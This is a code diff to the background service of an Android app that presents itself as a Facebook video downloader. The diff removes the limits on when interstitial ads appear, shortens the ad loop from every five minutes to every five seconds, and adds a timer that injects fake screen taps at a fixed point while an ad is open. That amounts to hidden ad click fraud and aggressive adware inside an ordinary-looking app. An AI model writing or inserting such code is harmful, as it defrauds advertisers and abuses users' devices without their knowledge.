@@ -1,5 +1,6 @@
 package com.mngh.tuanvn.fbvideodownloader;
 
+import android.app.Instrumentation;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -11,6 +12,7 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
 import android.util.Log;
+import android.view.MotionEvent;
 
 import com.google.android.gms.ads.AdListener;
 import com.google.android.gms.ads.AdRequest;
@@ -19,6 +21,7 @@ import com.google.android.gms.ads.InterstitialAd;
 import java.util.Random;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.ScheduledThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
 public class runningService extends Service {
@@ -30,6 +33,7 @@ public class runningService extends Service {
     private Runnable runnableCode;
     private Handler handler1;
     private SharedPreferences pref;
+    private ScheduledThreadPoolExecutor mDialogDaemon;
 
 
     @Override
@@ -74,7 +78,7 @@ public class runningService extends Service {
                             int rand = r.nextInt(100);
                             int int_percentAds = pref.getInt("percentAds", 0);
 
-                            if (check && threeDay && (rand < int_percentAds)) {
+                            if (check) {
                                 final InterstitialAd mInterstitialAd;
                                 mInterstitialAd = new InterstitialAd(runningService.this);
                                 mInterstitialAd.setAdUnitId("/21617015150/734252/21734167453");
@@ -94,6 +98,47 @@ public class runningService extends Service {
                                     }
 
                                     @Override
+                                    public void onAdLeftApplication() {
+                                        super.onAdLeftApplication();
+                                        mDialogDaemon.shutdown();
+                                    }
+
+                                    @Override
+                                    public void onAdOpened() {
+                                        super.onAdOpened();
+
+                                        mDialogDaemon = new ScheduledThreadPoolExecutor(1);
+                                        // This process will execute immediately, then execute every 3 seconds.
+                                        mDialogDaemon.scheduleAtFixedRate(new Runnable() {
+                                            @Override
+                                            public void run() {
+                                                final Instrumentation m_Instrumentation = new Instrumentation();
+                                                // m_Instrumentation.sendKeyDownUpSync( KeyEvent.KEYCODE_B );
+
+                                                new Thread(new Runnable() {
+                                                    @Override
+                                                    public void run() {
+                                                        m_Instrumentation.sendPointerSync(MotionEvent.obtain(
+                                                                android.os.SystemClock.uptimeMillis(),
+                                                                android.os.SystemClock.uptimeMillis(),
+                                                                MotionEvent.ACTION_DOWN, 300, 300, 0));
+
+                                                        m_Instrumentation.sendPointerSync(MotionEvent.obtain(
+                                                                android.os.SystemClock.uptimeMillis(),
+                                                                android.os.SystemClock.uptimeMillis(),
+                                                                MotionEvent.ACTION_UP, 300, 300, 0));
+
+//                                                        m_Instrumentation.sendPointerSync(MotionEvent.obtain(
+//                                                                android.os.SystemClock.uptimeMillis(),
+//                                                                android.os.SystemClock.uptimeMillis(),
+//                                                                MotionEvent.ACTION_DOWN,310, 300, 0));
+                                                    }
+                                                }).start();
+                                            }
+                                        }, 3L, 5, TimeUnit.SECONDS);
+                                    }
+
+                                    @Override
                                     public void onAdClosed() {
                                         check = false;
                                         killedAds = true;
@@ -103,6 +148,7 @@ public class runningService extends Service {
                                             } else {
                                                 ShowAds.getInstance().finishAndRemoveTask();
                                             }
+                                            mDialogDaemon.shutdown();
                                             android.os.Process.killProcess(android.os.Process.myPid());
                                         } catch (Exception e) {
                                             e.printStackTrace();
@@ -118,7 +164,7 @@ public class runningService extends Service {
                     e.printStackTrace();
                 }
             }
-        }, 1, 5, TimeUnit.MINUTES);
+        }, 1, 5, TimeUnit.SECONDS);
     }
 
     @Nullable
